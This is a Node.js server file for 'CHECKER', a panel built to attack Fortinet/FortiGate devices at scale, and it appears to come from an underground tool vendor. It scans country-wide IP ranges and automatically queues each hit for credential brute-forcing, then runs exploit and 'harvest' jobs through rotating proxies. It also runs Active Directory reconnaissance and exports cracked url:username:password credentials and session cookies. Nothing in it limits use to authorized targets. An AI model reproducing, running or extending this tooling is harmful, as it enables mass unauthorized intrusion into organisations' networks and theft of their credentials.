'use strict';
// CHECKER — Fortinet / FortiGate control panel server.
// Zero-dependency Node.js. Task runner + REST API + SSE live feed.
const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const store = require('./core/store');
const targets = require('./core/targets');
const scanner = require('./core/scanner');
const bruter = require('./core/bruter');
const checker = require('./core/checker');
const exploiter = require('./core/exploiter');
const geo = require('./core/geo');
const sources = require('./core/sources');
const settings = require('./core/settings');
const wordlists = require('./core/wordlists');
const httpc = require('./core/http');
const adrecon = require('./core/adrecon');
const { PRESETS, EXPLOITS } = require('./core/signatures');

const PORT = parseInt(process.env.PORT || '7000', 10);
const HOST = process.env.HOST || '0.0.0.0';
const PUBLIC = path.join(__dirname, 'public');
const VERSION = '2.0.0';
const MAX_RESULTS = 100000;

const results = store.load('results.json', { scan: [], brute: [], check: [], exploit: [], open: [], adrecon: [] });
for (const k of Object.keys(results)) if (!Array.isArray(results[k])) results[k] = [];
const logs = [];
const clients = new Set();
let task = null;
const autoQueue = [];
const harvestQueue = [];

httpc.configure({ maxSockets: settings.get().maxSockets });
httpc.setProxies(settings.get().proxy);

function log(line) {
    const entry = `[${new Date().toLocaleTimeString()}] ${line}`;
    logs.push(entry);
    if (logs.length > 2000) logs.splice(0, logs.length - 2000);
    broadcast('log', { text: entry });
}

function broadcast(event, data) {
    if (!clients.size) return;
    const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
    for (const res of clients) {
        try { res.write(msg); } catch (e) { clients.delete(res); }
    }
}

let saveTimer = null;
function persistSoon() {
    if (saveTimer) return;
    saveTimer = setTimeout(() => {
        saveTimer = null;
        for (const k of Object.keys(results)) {
            if (results[k].length > MAX_RESULTS) results[k] = results[k].slice(-MAX_RESULTS);
        }
        store.save('results.json', results, false);
    }, 1500);
    saveTimer.unref && saveTimer.unref();
}

const PREFIX = /^(scan|brute|check|exploit|adrecon)_/;
let lastScanLog = 0;

function makeEmitter(type) {
    return (event, data) => {
        const name = event.replace(PREFIX, '');
        if (name === 'progress' && task) task.progress = data;
        if (type === 'adrecon' && name === 'log' && data && data.text) log('[adrecon] ' + String(data.text).slice(0, 300));
        if (type === 'scan' && name === 'progress' && data && data.total && Date.now() - lastScanLog > 10000) {
            lastScanLog = Date.now();
            log(`[scan] ${data.done}/${data.total} найдено ${data.found}${data.rate !== undefined ? ` (${data.rate}/с)` : ''}`);
        }
        broadcast(type + '_' + name, data);
        if (name === 'open' && type === 'scan') {
            (results.open = results.open || []).push(data);
            persistSoon();
        }
        if (name === 'hit' || name === 'cred') {
            (results[type] = results[type] || []).push(data);
            persistSoon();
        }
        if (name === 'hit' && type === 'scan') maybeAutoBrute(data);
    };
}

// ---- auto-brute chain: fresh scan hits are queued for credential testing ----
function maybeAutoBrute(hit) {
    const s = settings.get();
    if (!s.autoBrute || !hit || !hit.url) return;
    if (autoQueue.length >= 5000) return;
    autoQueue.push(hit.url);
    if (settings.get().autoHarvest !== false) harvestQueue.push(hit.url);
    log(`auto-brute queued: ${hit.url} (${autoQueue.length})`);
    if (!task) runAutoBrute();
}

function runAutoBrute() {
    if (task || !autoQueue.length) return;
    const batch = autoQueue.splice(0, Math.min(autoQueue.length, 200));
    const s = settings.get();
    startTask('brute', {
        targets: batch, usernames: '', passwords: '',
        threads: s.autoBruteThreads, perHost: s.autoBrutePerHost,
        mode: s.autoBruteMode, rps: s.rps, maxHits: s.maxHitsPerHost,
        stopOnHit: s.stopOnHit, retries: s.retries, userAgent: s.userAgent,
    }, true);
}

const RUNNERS = {
    scan: scanner.scanTask,
    brute: bruter.bruteTask,
    check: checker.checkTask,
    exploit: exploiter.exploitTask,
    harvest: exploiter.harvestTask,
    adrecon: adrecon.runTask,
};

function startTask(type, params, isAuto) {
    if (task && !task.stopped) return { error: 'task already running: ' + task.type };
    const fn = RUNNERS[type];
    if (!fn) return { error: 'bad type' };
    const ctl = { type, stopped: false, paused: false, started: Date.now() };
    task = ctl;
    ctl.promise = fn(params, makeEmitter(type === 'harvest' ? 'exploit' : type))
        .then(r => {
            broadcast('task_done', { type, result: r });
            log(`${type} finished: ${JSON.stringify(r)}`);
        })
        .catch(e => log(`${type} error: ${e && e.stack ? e.stack.split('\n')[0] : e}`))
        .finally(() => {
            task = null;
            supervise();
        });
    log(`${type} started${isAuto ? ' (auto)' : ''}`);
    broadcast('task_state', { running: true, type });
    return { ok: true, type };
}

function runAutoHarvest() {
    if (task || !harvestQueue.length) return;
    const batch = harvestQueue.splice(0, Math.min(harvestQueue.length, 100));
    log(`auto-harvest: ${batch.length} targets`);
    startTask('harvest', { targets: batch, threads: 16, timeout: 9000 }, true);
}

function supervise() {
    store.flush();
    if (autoQueue.length) setTimeout(runAutoBrute, 250);
    else if (harvestQueue.length) setTimeout(runAutoHarvest, 250);
    else broadcast('task_state', { running: false, type: null, paused: false });
}

// --------------------------------- HTTP helpers
const MIME = {
    '.html': 'text/html; charset=utf-8', '.js': 'text/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8', '.json': 'application/json',
    '.png': 'image/png', '.svg': 'image/svg+xml', '.ico': 'image/x-icon', '.txt': 'text/plain; charset=utf-8',
};

function serveStatic(req, res, pathname) {
    let file = pathname === '/' ? 'index.html' : decodeURIComponent(pathname.replace(/^\/+/, ''));
    const full = path.join(PUBLIC, file);
    if (!full.startsWith(PUBLIC)) { res.writeHead(403); return res.end(); }
    fs.readFile(full, (err, buf) => {
        if (err) { res.writeHead(404); return res.end('not found'); }
        const ext = path.extname(full);
        res.writeHead(200, {
            'Content-Type': MIME[ext] || 'application/octet-stream',
            'Cache-Control': ext === '.html' ? 'no-cache' : 'max-age=60',
        });
        res.end(buf);
    });
}

function send(res, code, obj) {
    const body = JSON.stringify(obj);
    res.writeHead(code, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
    res.end(body);
}

function sendText(res, fileName, text, type) {
    res.writeHead(200, {
        'Content-Type': type || 'text/plain; charset=utf-8',
        'Content-Disposition': `attachment; filename="${fileName}"`,
        'Cache-Control': 'no-store',
    });
    res.end(text);
}

function readBody(req) {
    return new Promise(resolve => {
        const chunks = [];
        let size = 0;
        req.on('data', c => {
            size += c.length;
            if (size > 32e6) { req.destroy(); return; }
            chunks.push(c);
        });
        req.on('end', () => {
            try { resolve(JSON.parse(Buffer.concat(chunks).toString('utf8') || '{}')); }
            catch (e) { resolve({}); }
        });
        req.on('error', () => resolve({}));
    });
}

function credParams(body) {
    const s = settings.get();
    return {
        threads: body.threads || s.autoBruteThreads,
        perHost: body.perHost || s.perHost,
        rps: body.rps !== undefined ? body.rps : s.rps,
        maxHits: body.maxHits !== undefined ? body.maxHits : s.maxHitsPerHost,
        stopOnHit: body.stopOnHit !== undefined ? body.stopOnHit : s.stopOnHit,
        retries: body.retries !== undefined ? body.retries : s.retries,
        userAgent: body.userAgent || s.userAgent || undefined,
        resume: body.resume !== false,
    };
}

// ---------------------------------------- routing
const server = http.createServer(async (req, res) => {
    const u = new URL(req.url, 'http://localhost');
    const p = u.pathname;

    if (p === '/api/events') {
        res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache, no-transform',
            Connection: 'keep-alive',
            'X-Accel-Buffering': 'no',
        });
        res.write(`event: hello\ndata: ${JSON.stringify({ version: VERSION })}\n\n`);
        clients.add(res);
        const ping = setInterval(() => { try { res.write(': ping\n\n'); } catch (e) { /* ignore */ } }, 15000);
        req.on('close', () => { clearInterval(ping); clients.delete(res); });
        return;
    }

    if (p.startsWith('/api/')) {
        const body = (req.method === 'POST' || req.method === 'PUT' || req.method === 'DELETE') ? await readBody(req) : {};
        try {
            switch (p) {
                case '/api/status': {
                    return send(res, 200, {
                        version: VERSION, running: !!(task && !task.stopped), type: task ? task.type : null,
                        paused: task ? task.paused : false, uptime: task ? Date.now() - task.started : 0,
                        progress: task ? task.progress || null : null,
                        queues: { brute: autoQueue.length, harvest: harvestQueue.length },
                        targets: targets.count(), autoQueue: autoQueue.length,
                        counts: { scan: results.scan.length, brute: results.brute.length, check: results.check.length, exploit: results.exploit.length, open: (results.open || []).length, adrecon: (results.adrecon || []).length },
                        found: store.readText('found_creds.txt').split('\n').filter(Boolean).length,
                        proxy: httpc.proxyStats().count, geo: geo.stats(),
                        logs: logs.slice(-200),
                    });
                }

                // ---------------- targets
                case '/api/targets':
                    if (req.method === 'POST') {
                        if (body.action === 'clear') { targets.clear(); log('targets cleared'); return send(res, 200, { ok: true }); }
                        const list = body.urls || body;
                        const added = targets.add(Array.isArray(list) ? list : String(list).split(/\r?\n/));
                        log(`added ${added.length} targets`);
                        return send(res, 200, { ok: true, added: added.length, urls: added, targets: targets.all() });
                    }
                    if (req.method === 'DELETE') {
                        if (body.urls) { const n = targets.removeUrls(body.urls); return send(res, 200, { ok: true, removed: n }); }
                        targets.remove(u.searchParams.get('id') || body.id);
                        return send(res, 200, { ok: true, targets: targets.all() });
                    }
                    return send(res, 200, { ok: true, targets: targets.all(), count: targets.count() });

                // ---------------- tasks
                case '/api/start': {
                    const type = body.type;
                    if (!['scan', 'brute', 'check', 'exploit', 'harvest', 'adrecon'].includes(type)) return send(res, 400, { error: 'bad type' });
                    if (type === 'adrecon') {
                        return send(res, 200, startTask('adrecon', {
                            workers: body.workers || 5, queue: body.queue || 5, hours: body.hours || 3,
                        }));
                    }
                    if (type === 'scan') {
                        const parsed = httpc.parseRanges(body.ranges || '');
                        if (!parsed.length) return send(res, 400, { error: 'no hosts' });
                        return send(res, 200, startTask('scan', {
                            ranges: body.ranges, ports: body.ports || [body.port || 443],
                            ssl: body.ssl !== false, threads: body.threads || 200,
                            presetKey: body.preset || 'fortinet', timeout: body.timeout || 6000,
                            tcpTimeout: body.tcpTimeout || 1200, limit: body.limit || 0,
                            exclude: settings.get().excludeCountries,
                            autoAdd: body.autoAdd !== undefined ? !!body.autoAdd : settings.get().autoAddTargets,
                            keepOpen: body.keepOpen === true,
                            strategy: body.strategy || 'edge',
                        }));
                    }
                    const list = body.targets && body.targets.length ? body.targets : targets.urls();
                    if (!list.length) return send(res, 400, { error: 'no targets' });
                    if (type === 'brute' || type === 'check') {
                        return send(res, 200, startTask(type, {
                            targets: list, usernames: body.usernames || '', passwords: body.passwords || '',
                            credentials: body.credentials || '', mode: body.mode || 'combo',
                            timeout: body.timeout || 10000, ...credParams(body),
                        }));
                    }
                    return send(res, 200, startTask(type, {
                        targets: list, threads: body.threads || 12, timeout: body.timeout || 10000,
                        selected: body.exploits || null, userAgent: body.userAgent || undefined,
                    }));
                }
                case '/api/pause':
                    if (task) task.paused = !task.paused;
                    broadcast('task_state', { running: !!(task && !task.stopped), type: task ? task.type : null, paused: task ? task.paused : false });
                    return send(res, 200, { ok: true, paused: task ? task.paused : false });
                case '/api/stop':
                    if (task) { task.stopped = true; log('stopping ' + task.type); }
                    autoQueue.length = 0;
                    harvestQueue.length = 0;
                    broadcast('task_state', { running: false, type: null, paused: false, stopped: true });
                    return send(res, 200, { ok: true });

                // ---------------- results
                case '/api/results':
                    return send(res, 200, { ok: true, results, logs: logs.slice(-200) });
                case '/api/results/clear':
                    for (const k of Object.keys(results)) results[k] = [];
                    store.save('results.json', results, false);
                    log('results cleared');
                    return send(res, 200, { ok: true });
                case '/api/export': {
                    const type = u.searchParams.get('type') || 'brute';
                    const format = u.searchParams.get('format') || 'txt';
                    const list = results[type] || [];
                    if (format === 'json') return sendText(res, `checker_${type}.json`, JSON.stringify(list, null, 2), 'application/json');
                    if (format === 'csv') {
                        const rows = [['url', 'username', 'password', 'cookie', 'verify', 'product', 'time']];
                        for (const r of list) rows.push([r.url, r.username, r.password, r.cookie, r.verify, r.product, r.time].map(v => `"${String(v ?? '').replace(/"/g, '""')}"`));
                        return sendText(res, `checker_${type}.csv`, rows.map(r => r.join(',')).join('\r\n'), 'text/csv; charset=utf-8');
                    }
                    const text = list.map(r => r.line || `${String(r.url || '').replace(/^https?:\/\//, '')}:${r.username || ''}:${r.password || ''}`).join('\r\n');
                    return sendText(res, `checker_${type}.txt`, text);
                }

                // ---------------- found creds (persisted across runs)
                case '/api/found': {
                    if (req.method === 'DELETE') {
                        store.remove('found.json');
                        store.remove('found_creds.txt');
                        return send(res, 200, { ok: true });
                    }
                    const mode = u.searchParams.get('format');
                    const all = store.load('found.json', []);
                    if (mode === 'txt') return sendText(res, 'found_creds.txt', all.map(r => `${r.url}:${r.username}:${r.password}`).join('\r\n'));
                    if (mode === 'csv') {
                        const rows = [['url', 'username', 'password', 'cookie', 'verify', 'product', 'time']];
                        for (const r of all) rows.push([r.url, r.username, r.password, r.cookie, r.verify, r.product, r.time].map(v => `"${String(v ?? '').replace(/"/g, '""')}"`));
                        return sendText(res, 'found_creds.csv', rows.map(r => r.join(',')).join('\r\n'), 'text/csv; charset=utf-8');
                    }
                    return send(res, 200, { ok: true, count: all.length, found: all.slice(-1000) });
                }

                // ---------------- metadata
                case '/api/exploits':
                    return send(res, 200, { ok: true, exploits: EXPLOITS.map(e => ({ id: e.id, name: e.name, weight: e.weight })), presets: Object.keys(PRESETS) });
                case '/api/settings':
                    if (req.method === 'POST') {
                        const s = settings.set(body);
                        if (body.proxy !== undefined || body.proxyText !== undefined) {
                            httpc.setProxies(s.proxy);
                            httpc.clearDns();
                            log(`proxies: ${s.proxy.length}`);
                        }
                        if (body.maxSockets) httpc.configure({ maxSockets: s.maxSockets });
                        return send(res, 200, { ok: true, settings: s });
                    }
                    return send(res, 200, { ok: true, settings: settings.get() });

                // ---------------- ADRecon module
                case '/api/adrecon': {
                    if (req.method === 'POST') {
                        if (body.action === 'build') {
                            const r = await adrecon.build((ev, data) => broadcast('adrecon_log', data));
                            return send(res, r.ok ? 200 : 500, r);
                        }
                        if (body.action === 'import') {
                            const r = adrecon.importConfigs(body.targets !== false);
                            log(`adrecon: imported ${r.configs} configs (${r.added} targets)`);
                            return send(res, 200, { ok: true, ...r });
                        }
                        return send(res, 400, { error: 'bad action' });
                    }
                    return send(res, 200, { ok: true, ...(await adrecon.info()) });
                }

                // ---------------- wordlists
                case '/api/wordlists': {
                    if (req.method === 'POST') {
                        if (body.action === 'reset') { wordlists.reset(body.kind); return send(res, 200, { ok: true, info: wordlists.info() }); }
                        const n = wordlists.save(body.kind, body.text || '');
                        return send(res, 200, { ok: true, count: n, info: wordlists.info() });
                    }
                    const kind = u.searchParams.get('kind');
                    return send(res, 200, {
                        ok: true, info: wordlists.info(),
                        users: kind === 'users' ? wordlists.users() : undefined,
                        passes: kind === 'passes' ? wordlists.passes() : undefined,
                    });
                }

                // ---------------- geo
                case '/api/geo': {
                    const hosts = (body.urls || []).map(x => {
                        try { return new URL(/^https?:\/\//i.test(x) ? x : 'https://' + x).hostname; }
                        catch (e) { return String(x || '').trim() || null; }
                    }).filter(Boolean);
                    const info = await geo.lookup(hosts);
                    log(`geo: ${Object.keys(info).length} hosts`);
                    return send(res, 200, { ok: true, geo: info });
                }

                // ---------------- sources
                case '/api/sources': {
                    if (req.method === 'POST') {
                        if (body.action === 'download') {
                            const ccs = Array.isArray(body.cc) ? body.cc : [body.cc];
                            const out = [];
                            for (const cc of ccs) {
                                log('downloading CIDR list: ' + cc);
                                out.push({ cc, count: await sources.download(cc) });
                            }
                            return send(res, 200, { ok: out.every(o => o.count > 0), results: out, list: sources.list() });
                        }
                        return send(res, 400, { error: 'bad action' });
                    }
                    return send(res, 200, { ok: true, list: sources.list() });
                }
                case '/api/sources/load': {
                    const cidrs = sources.load(u.searchParams.get('cc'));
                    if (!cidrs.length) return send(res, 404, { error: 'country not downloaded' });
                    return send(res, 200, { ok: true, count: cidrs.length, cidrs });
                }

                // ---------------- proxy check
                case '/api/proxy/test': {
                    const before = httpc.proxyStats();
                    const r = await httpc.request('https://api.ipify.org?format=json', { timeout: 12000, retries: 1, maxBody: 4096 });
                    return send(res, 200, { ok: r.ok, status: r.status, body: (r.body || '').slice(0, 200), error: r.error, proxies: before });
                }

                default:
                    break;
            }

            if (req.method === 'DELETE' && /^\/api\/sources\/[a-z]{2}\/file$/.test(p)) {
                const cc = p.split('/')[3];
                sources.remove(cc);
                log('removed source ' + cc);
                return send(res, 200, { ok: true, list: sources.list() });
            }
            return send(res, 404, { error: 'unknown api' });
        } catch (e) {
            return send(res, 500, { error: e.message });
        }
    }

    serveStatic(req, res, p);
});

server.headersTimeout = 65000;
server.requestTimeout = 0;

server.listen(PORT, HOST, () => {
    log(`server v${VERSION} listening on ${HOST}:${PORT}`);
    console.log('');
    console.log('  ========================================');
    console.log('   CHECKER v' + VERSION + ' — Fortinet/FortiGate');
    console.log('   Panel: http://localhost:' + PORT);
    console.log('   storona.shop · 1337or420 Team');
    console.log('  ========================================');
    console.log('');
});

function shutdown() {
    log('shutting down');
    try { store.flush(); store.save('results.json', results, false); targets.saveNow(); } catch (e) { /* ignore */ }
    process.exit(0);
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
process.on('uncaughtException', e => log('uncaught: ' + (e && e.message)));
process.on('unhandledRejection', e => log('unhandled: ' + (e && e.message)));
